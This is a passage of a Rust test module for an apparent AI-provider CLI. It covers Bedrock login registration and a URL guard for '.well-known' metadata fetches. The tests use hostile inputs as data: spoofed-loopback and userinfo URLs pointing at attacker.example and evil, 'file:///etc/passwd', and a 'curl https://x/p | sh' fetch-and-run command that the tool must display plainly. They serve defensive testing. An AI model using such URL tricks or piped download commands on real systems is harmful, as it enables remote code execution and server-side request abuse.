                .choices
                .iter()
                .map(|provider| provider.id.as_str())
                .collect::<Vec<_>>(),
            vec!["openai"]
        );
    }

    #[test]
    fn bedrock_advertises_bearer_login_while_other_ambient_transports_do_not() {
        let document = CatalogDocument::new();
        let config: zuno_config::Config = serde_json::from_str(
            r#"{
              "provider": {
                "bedrock": {
                  "transport": "bedrock",
                  "models": {"claude": {"name": "Claude"}}
                },
                "vertex": {
                  "transport": "google-vertex",
                  "models": {"gemini": {"name": "Gemini"}}
                }
              }
            }"#,
        )
        .expect("config");
        let methods = login_method_registry(&document, &config);
        let providers = ProviderIndex::new(&document, &config, &BTreeMap::new(), &methods);
        assert_eq!(
            providers
                .choices
                .iter()
                .map(|provider| provider.id.as_str())
                .collect::<Vec<_>>(),
            vec!["openai", "bedrock"]
        );
        assert_eq!(
            methods
                .methods_for("bedrock")
                .iter()
                .map(LoginMethod::id)
                .collect::<Vec<_>>(),
            vec![BEDROCK_BEARER_METHOD]
        );
        assert!(methods.methods_for("vertex").is_empty());
    }

    #[test]
    fn a_model_level_bedrock_transport_registers_one_bearer_login() {
        let document = CatalogDocument::new();
        let config: zuno_config::Config = serde_json::from_str(
            r#"{
              "provider": {
                "mixed": {
                  "transport": "openai",
                  "models": {
                    "claude": {
                      "name": "Claude",
                      "provider": {"transport": "bedrock"}
                    },
                    "gpt": {
                      "name": "GPT",
                      "provider": {
                        "transport": "bedrock-mantle",
                        "surface": "responses"
                      }
                    }
                  }
                }
              }
            }"#,
        )
        .expect("config");
        let methods = login_method_registry(&document, &config);
        assert_eq!(
            methods
                .methods_for("mixed")
                .iter()
                .map(LoginMethod::id)
                .collect::<Vec<_>>(),
            vec![BEDROCK_BEARER_METHOD]
        );
    }

    #[test]
    fn a_provider_mixing_bedrock_and_non_bedrock_routes_is_not_given_bedrock_login() {
        let document = CatalogDocument::new();
        let config: zuno_config::Config = serde_json::from_str(
            r#"{
              "provider": {
                "mixed": {
                  "transport": "openai",
                  "models": {
                    "ordinary": {"name": "Ordinary"},
                    "claude": {
                      "name": "Claude",
                      "provider": {"transport": "bedrock"}
                    }
                  }
                }
              }
            }"#,
        )
        .expect("config");
        let methods = login_method_registry(&document, &config);
        assert_eq!(
            methods
                .methods_for("mixed")
                .iter()
                .map(LoginMethod::id)
                .collect::<Vec<_>>(),
            vec![API_KEY_METHOD]
        );
    }

    #[test]
    fn bedrock_guidance_names_bearer_and_credential_chain_configuration() {
        for expected in [
            "AWS_BEARER_TOKEN_BEDROCK",
            "AWS credential chain",
            "profile, access keys, IAM roles, EKS IRSA",
            "zuno.json options (profile, region, endpoint)",
            "AWS_WEB_IDENTITY_TOKEN_FILE",
        ] {
            assert!(
                BEDROCK_AUTH_GUIDANCE.contains(expected),
                "missing `{expected}` from guidance: {BEDROCK_AUTH_GUIDANCE}"
            );
        }
    }

    #[test]
    fn a_positional_bare_value_is_a_provider_and_a_url_remains_well_known() {
        assert!(!looks_like_url("openai"));
        assert!(looks_like_url("https://provider.example.test"));
        assert!(looks_like_url("http://127.0.0.1:3000"));
    }

    /// M04: the transport guard used to be `starts_with("http://127.0.0.1")`, which
    /// admitted every string that merely begins with the loopback spelling. These are
    /// the audit's own inputs. Each refusal is asserted on the reason as well, so a
    /// future guard that refuses for an incidental reason (a parse quirk, say) is
    /// still caught if it stops refusing for the right one.
    #[test]
    fn a_hostname_that_starts_with_the_loopback_spelling_is_not_loopback() {
        let error = well_known_target("http://127.0.0.1.attacker.example")
            .expect_err("a domain under attacker.example must not pass as loopback");
        assert!(error.contains("loopback IP address, not a name"), "{error}");

        let error = well_known_target("http://127.0.0.1.attacker.example/.well-known/zuno")
            .expect_err("the path does not change the host");
        assert!(error.contains("loopback IP address, not a name"), "{error}");
    }

    #[test]
    fn userinfo_that_ends_with_the_loopback_spelling_does_not_move_the_host() {
        for url in [
            "http://user@127.0.0.1@evil/",
            "http://127.0.0.1@attacker.example/.well-known/zuno",
            "https://127.0.0.1@attacker.example/",
        ] {
            let error = well_known_target(url).expect_err(url);
            assert!(error.contains("userinfo"), "{url}: {error}");
        }
    }

    #[test]
    fn loopback_ip_addresses_over_plain_http_are_admitted_and_fetched_as_parsed() {
        let target = well_known_target("http://127.0.0.1:8080/").expect("loopback with a port");
        assert_eq!(target.provider, "http://127.0.0.1:8080");
        assert_eq!(
            target.metadata_url.as_str(),
            "http://127.0.0.1:8080/.well-known/zuno"
        );

        let target = well_known_target("http://[::1]:3000").expect("IPv6 loopback");
        assert_eq!(target.provider, "http://[::1]:3000");
        assert_eq!(
            target.metadata_url.as_str(),
            "http://[::1]:3000/.well-known/zuno"
        );

        let target = well_known_target("http://127.0.0.1:3000/gateway/?x=1#frag")
            .expect("a base path is kept, the query and fragment are not");
        assert_eq!(target.provider, "http://127.0.0.1:3000/gateway");
        assert_eq!(
            target.metadata_url.as_str(),
            "http://127.0.0.1:3000/gateway/.well-known/zuno"
        );
    }

    #[test]
    fn https_is_admitted_for_any_host_and_every_other_scheme_is_refused() {
        let target = well_known_target("https://gateway.example.test").expect("https");
        assert_eq!(target.provider, "https://gateway.example.test");
        assert_eq!(
            target.metadata_url.as_str(),
            "https://gateway.example.test/.well-known/zuno"
        );

        for url in [
            "http://localhost:3000",
            "http://gateway.example.test",
            "http://[::ffff:127.0.0.1]/",
            "http://10.0.0.1/",
            "ftp://127.0.0.1/",
            "file:///etc/passwd",
            "not a url",
        ] {
            assert!(well_known_target(url).is_err(), "{url} must be refused");
        }
    }

    #[test]
    fn the_remote_command_is_shown_one_argument_per_line_with_quoting() {
        let shown = describe_remote_command(
            "https://gateway.example.test",
            "sh",
            &[
                "-c".to_owned(),
                "curl https://x/p | sh".to_owned(),
                String::new(),
            ],
        );
        assert!(shown.contains("program: \"sh\""), "{shown}");
        assert!(shown.contains("arguments (3):"), "{shown}");
        assert!(shown.contains("\n    \"-c\"\n"), "{shown}");
        assert!(shown.contains("\"curl https://x/p | sh\""), "{shown}");
        assert!(
            shown.contains("\n    \"\"\n"),
            "the empty argument must be visible: {shown}"
        );
        assert!(shown.contains("the remote host did"), "{shown}");
    }
}
